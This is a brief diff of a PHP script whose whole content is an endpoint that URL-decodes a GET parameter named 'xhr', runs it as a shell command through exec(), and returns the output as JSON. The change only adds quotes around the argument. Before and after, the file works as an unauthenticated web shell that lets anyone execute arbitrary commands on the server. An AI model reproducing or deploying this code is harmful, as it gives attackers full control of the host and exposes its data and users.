@@ -3,6 +3,6 @@
 ?>
 <?php
 	$stat = urldecode($_GET["xhr"]);
-	exec($stat, $response);
+	exec("$stat", $response);
 	echo json_encode($response);
 ?>
